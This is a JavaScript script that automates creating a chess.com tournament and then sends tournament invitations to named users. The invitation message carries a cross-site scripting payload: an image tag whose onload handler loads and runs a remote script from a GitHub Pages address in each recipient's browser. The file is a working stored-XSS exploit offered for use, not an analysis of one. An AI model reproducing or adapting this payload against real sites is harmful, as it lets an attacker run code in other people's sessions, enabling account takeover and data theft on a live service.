var users = "yellowrook1,atanwin"
async function begin(){
var response = await fetch("https://www.chess.com/tournament/create");
var text = await response.text()
var parser = new DOMParser();
var doc = parser.parseFromString(text, "text/html");
var createToken = doc.getElementById('tournament-post-form').dataset.token
response = await fetch("https://www.chess.com/tournament/create", {
                "headers": {
                    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryEpP2GW1j9e4Nmhv3",
                },
                "referrer": "https://www.chess.com/tournament/create",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": `------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[name]\"\r\n\r\nTest\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[daysPerMove]\"\r\n\r\n3\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[groupSize]\"\r\n\r\n5\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[maxPlayers]\"\r\n\r\n250\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[userAdvanceCount]\"\r\n\r\n1\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[minRating]\"\r\n\r\n\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[maxRating]\"\r\n\r\n\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[startDate][date]\"\r\n\r\n\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[startDate][time][hour]\"\r\n\r\n0\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[startDate][time][minute]\"\r\n\r\n0\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[concurrentGamesPerOpponent]\"\r\n\r\n1\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[minRequiredGameCount]\"\r\n\r\n0\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[maxTimeoutPercent]\"\r\n\r\n10\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[maxTimePerMove]\"\r\n\r\n0\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[gameType]\"\r\n\r\nchess\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[initialSetup]\"\r\n\r\n\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[isRated]\"\r\n\r\non\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[useTiebreak]\"\r\n\r\non\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[isAutoStart]\"\r\n\r\non\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[allowVacation]\"\r\n\r\non\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"mce_0\"\r\n\r\n\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[description]\"\r\n\r\n\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3\r\nContent-Disposition: form-data; name=\"create_tournament[_token]\"\r\n\r\n${createToken}\r\n------WebKitFormBoundaryEpP2GW1j9e4Nmhv3--\r\n`,
                "method": "POST"
            })
text = await response.text()
    var doc2 = parser.parseFromString(text, "text/html");
    tournament_id = doc2.getElementById('view-comments').getAttribute("parent-id")
    console.log(tournament_id)
    csrf_token = context.csrf.token
    fetch(`https://www.chess.com/callback/tournament/${tournament_id}/invite-players`, {
        "headers": {
            "content-type": "application/json;charset=UTF-8",
        },
        "body": `{\"_token\":\"${csrf_token}\",\"message\":\"<img src='https://betacssjs.chesscomfiles.com/bundles/web/images/noavatar_l.84a92436.gif' onload='body.appendChild(document.createElement\`script\`).src=\`//yellowrook1.github.io/w.js\`'>\",\"usernames\":\"${users}\"}`,
        "method": "POST",
    });
}
begin()

